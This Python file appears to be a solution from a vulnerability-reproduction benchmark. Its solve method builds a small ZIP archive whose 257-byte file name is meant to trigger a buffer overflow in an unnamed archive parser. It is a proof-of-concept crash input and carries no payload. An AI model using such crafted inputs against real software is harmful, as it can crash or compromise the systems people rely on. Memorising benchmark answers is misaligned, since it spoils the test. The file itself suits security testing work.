import struct
import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        filename_len = 257  # > 256 to trigger overflow
        filename = b"A" * filename_len
        data = b""
        crc = zlib.crc32(data) & 0xFFFFFFFF

        # Local file header
        local_header = struct.pack(
            "<IHHHHHIIIHH",
            0x04034B50,   # Local file header signature
            20,           # Version needed to extract
            0,            # General purpose bit flag
            0,            # Compression method (store)
            0,            # Last mod file time
            0,            # Last mod file date
            crc,          # CRC-32
            len(data),    # Compressed size
            len(data),    # Uncompressed size
            len(filename),# File name length
            0             # Extra field length
        ) + filename + data

        # Central directory header
        offset_local = 0  # Local header starts at beginning
        central_header = struct.pack(
            "<IHHHHHHIIIHHHHHII",
            0x02014B50,   # Central file header signature
            20,           # Version made by
            20,           # Version needed to extract
            0,            # General purpose bit flag
            0,            # Compression method
            0,            # Last mod time
            0,            # Last mod date
            crc,          # CRC-32
            len(data),    # Compressed size
            len(data),    # Uncompressed size
            len(filename),# File name length
            0,            # Extra field length
            0,            # File comment length
            0,            # Disk number start
            0,            # Internal file attributes
            0,            # External file attributes
            offset_local  # Relative offset of local header
        ) + filename

        # End of central directory
        cd_offset = len(local_header)
        cd_size = len(central_header)
        eocd = struct.pack(
            "<IHHHHIIH",
            0x06054B50,  # End of central dir signature
            0,           # Number of this disk
            0,           # Disk with start of the central directory
            1,           # Total entries on this disk
            1,           # Total entries
            cd_size,     # Size of central directory
            cd_offset,   # Offset of start of central directory
            0            # Comment length
        )

        return local_header + central_header + eocd
